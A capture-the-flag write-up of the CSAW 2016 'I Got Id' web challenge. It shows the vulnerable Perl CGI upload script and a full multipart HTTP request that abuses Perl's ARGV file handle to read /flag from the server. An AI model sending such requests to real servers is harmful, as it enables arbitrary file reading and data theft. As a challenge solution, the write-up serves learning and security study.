---
layout: post
ctf: "CSAW CTF Quals 2016"
title: "Web 200 - I Got Id"
---

This challlenge was a frustrating blackbox. No information was given about it, although, it was obvious that the website was made using Perl. We solve this challenge on the last day when someone stumbled uppon a [Blackhat ASIA 2016 talk](https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf) about Perl that seemed to fit what the challenge was doing.

Here is the full source code of `file.pl`

```perl
use strict;
use warnings;
use CGI;

my $cgi = CGI->new;

print $cgi->header;

print << "EndOfHTML";
<!DOCTYPE html
 	PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
 	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"
>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" xml:lang="en-US">
 	<head>
 		<title>Perl File Upload</title>
 		<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
 	</head>
 	<body>
 		<h1>Perl File Upload</h1>
 		<form method="post" enctype="multipart/form-data">
 			File: <input type="file" name="file" />
 			<input type="submit" name="Submit!" value="Submit!" />
 		</form>
 		<hr />
EndOfHTML

if ($cgi->upload('file')) {
    my $file = $cgi->param('file');
    while (<$file>) {
        print "$_";
        print "<br />";
    }
}

print '</body></html>';
```

The slides explains pretty well how to exploit this script. We had a local file inclusion vulnerability that we can exploit to find the flag. This request was then made to extract the file `/flag` which conveniently contained the flag solving the challenge.

```
POST http://127.0.0.1/cgi-bin/file.pl?/flag HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBmriDnOpKyHMfymW

------WebKitFormBoundaryBmriDnOpKyHMfymW
Content-Disposition: form-data; name="file"

ARGV
------WebKitFormBoundaryBmriDnOpKyHMfymW
Content-Disposition: form-data; name="file"; filename="we"
Content-Type: text/aaaa

123
------WebKitFormBoundaryBmriDnOpKyHMfymW--
```
